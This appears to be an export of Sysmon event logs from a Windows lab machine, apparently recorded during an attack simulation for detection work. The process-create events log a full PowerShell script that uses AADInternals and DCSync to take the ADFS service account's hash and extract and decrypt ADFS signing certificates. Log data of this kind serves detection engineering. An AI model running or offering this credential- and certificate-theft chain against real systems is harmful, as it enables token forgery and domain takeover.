      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {Import-Module ActiveDirectory -Force 
Import-Module AADInternals -Force | Out-Null
#Get Configuration
$dcServerName = (Get-ADDomainController).HostName
$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \""""adfs_svc\""""
$PWord = ConvertTo-SecureString -String \""""ReallyStrongPassword\"""" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Administrator, $PWord
# use DCSync to fetch the ADFS service account's NT hash
$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex
$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com
# Get certificates decryption key
$Configuration = [xml]$ADFSConfig
$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group
$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName
$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn
$base = \""""LDAP://CN=$group,$container,$parent\""""
$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))
$ADSearch.Filter = '(name=CryptoPolicy)'
$ADSearch.PropertiesToLoad.Clear()
$ADSearch.PropertiesToLoad.Add(\""""displayName\"""") | Out-Null
$aduser = $ADSearch.FindOne()
$keyObjectGuid = $ADUser.Properties[\""""displayName\""""] 
$ADSearch.PropertiesToLoad.Clear()
$ADSearch.PropertiesToLoad.Add(\""""thumbnailphoto\"""") | Out-Null
$ADSearch.Filter=\""""(l=$keyObjectGuid)\""""
$aduser=$ADSearch.FindOne() 
$key=[byte[]]$aduser.Properties[\""""thumbnailphoto\""""][0] 
# Get encrypted certificates from configuration and decrypt them
Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key
Get-ChildItem | Where-Object {$_ -like \""""ADFS*\""""}
Write-Host \""""`nCertificates retrieved successfully\""""}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:25:51.581

ProcessGuid: {fda94052-3f1f-658d-7302-000000000b00}

ProcessId: 9568

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {Import-Module ActiveDirectory -Force 
Import-Module AADInternals -Force | Out-Null
#Get Configuration
$dcServerName = (Get-ADDomainController).HostName
$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \""""adfs_svc\""""
$PWord = ConvertTo-SecureString -String \""""ReallyStrongPassword\"""" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Administrator, $PWord
# use DCSync to fetch the ADFS service account's NT hash
$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex
$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com
# Get certificates decryption key
$Configuration = [xml]$ADFSConfig
$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group
$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName
$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn
$base = \""""LDAP://CN=$group,$container,$parent\""""
$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))
$ADSearch.Filter = '(name=CryptoPolicy)'
$ADSearch.PropertiesToLoad.Clear()
$ADSearch.PropertiesToLoad.Add(\""""displayName\"""") | Out-Null
$aduser = $ADSearch.FindOne()
$keyObjectGuid = $ADUser.Properties[\""""displayName\""""] 
$ADSearch.PropertiesToLoad.Clear()
$ADSearch.PropertiesToLoad.Add(\""""thumbnailphoto\"""") | Out-Null
$ADSearch.Filter=\""""(l=$keyObjectGuid)\""""
$aduser=$ADSearch.FindOne() 
$key=[byte[]]$aduser.Properties[\""""thumbnailphoto\""""][0] 
# Get encrypted certificates from configuration and decrypt them
Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key
Get-ChildItem | Where-Object {$_ -like \""""ADFS*\""""}
Write-Host \""""`nCertificates retrieved successfully\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:25:49.732,,,,,,,,11,9467,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:25:49.732

ProcessGuid: {fda94052-3f1d-658d-7102-000000000b00}

ProcessId: 1128

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_wqjslmni.pwx.ps1

CreationUtcTime: 2023-12-28 09:25:49.732

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-3f1d-658d-7102-000000000b00},7044,1128,,,,,,"
      ",-,,,,,,2023-12-28T09:25:49.7403934Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_wqjslmni.pwx.ps1,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:25:49.732,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:25:49.7403934Z""/>
      <EventRecordID>9467</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:25:49.732</Data>
      <Data Name=""ProcessGuid"">{fda94052-3f1d-658d-7102-000000000b00}</Data>
      <Data Name=""ProcessId"">1128</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_wqjslmni.pwx.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:25:49.732</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:25:49.732

ProcessGuid: {fda94052-3f1d-658d-7102-000000000b00}

ProcessId: 1128

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_wqjslmni.pwx.ps1

CreationUtcTime: 2023-12-28 09:25:49.732

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {Import-Module AADInternals -Force
Export-AADIntADFSCertificates
Get-ChildItem | Where-Object {$_ -like \""""ADFS*\""""}
Write-Host \""""`nCertificates retrieved successfully\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,9466,10.0.22621.2215 (WinBuild.160101.0800),"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:25:49.584

ProcessGuid: {fda94052-3f1d-658d-7102-000000000b00}

ProcessId: 1128

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {Import-Module AADInternals -Force
Export-AADIntADFSCertificates
Get-ChildItem | Where-Object {$_ -like \""""ADFS*\""""}
Write-Host \""""`nCertificates retrieved successfully\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-3f1d-658d-7102-000000000b00},7044,1128,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:25:49.5855927Z,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:25:49.584,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:25:49.5855927Z""/>
      <EventRecordID>9466</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:25:49.584</Data>
      <Data Name=""ProcessGuid"">{fda94052-3f1d-658d-7102-000000000b00}</Data>
      <Data Name=""ProcessId"">1128</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {Import-Module AADInternals -Force
Export-AADIntADFSCertificates
Get-ChildItem | Where-Object {$_ -like \""""ADFS*\""""}
Write-Host \""""`nCertificates retrieved successfully\""""}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:25:49.584

ProcessGuid: {fda94052-3f1d-658d-7102-000000000b00}

ProcessId: 1128

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {Import-Module AADInternals -Force
Export-AADIntADFSCertificates
Get-ChildItem | Where-Object {$_ -like \""""ADFS*\""""}
Write-Host \""""`nCertificates retrieved successfully\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,22,9465,,,C:\Windows\system32\svchost.exe,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 23:54:39.888

ProcessGuid: {fda94052-34f2-658d-3f00-000000000b00}

ProcessId: 2948

QueryName: wpad

QueryStatus: 1460

QueryResults: -

Image: C:\Windows\system32\svchost.exe

User: NT AUTHORITY\LOCAL SERVICE",Info,,,,,,,{fda94052-34f2-658d-3f00-000000000b00},7044,2948,,,wpad,-,1460,"
      ",-,,,,,,2023-12-28T09:25:48.9676259Z,,Dns query (rule: DnsQuery),,1124,NT AUTHORITY\LOCAL SERVICE,S-1-5-18,2023-12-27 23:54:39.888,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:25:48.9676259Z""/>
      <EventRecordID>9465</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""1124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 23:54:39.888</Data>
      <Data Name=""ProcessGuid"">{fda94052-34f2-658d-3f00-000000000b00}</Data>
      <Data Name=""ProcessId"">2948</Data>
      <Data Name=""QueryName"">wpad</Data>
      <Data Name=""QueryStatus"">1460</Data>
      <Data Name=""QueryResults"">-</Data>
      <Data Name=""Image"">C:\Windows\system32\svchost.exe</Data>
      <Data Name=""User"">NT AUTHORITY\LOCAL SERVICE</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 23:54:39.888

ProcessGuid: {fda94052-34f2-658d-3f00-000000000b00}

ProcessId: 2948

QueryName: wpad

QueryStatus: 1460

QueryResults: -

Image: C:\Windows\system32\svchost.exe

User: NT AUTHORITY\LOCAL SERVICE</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
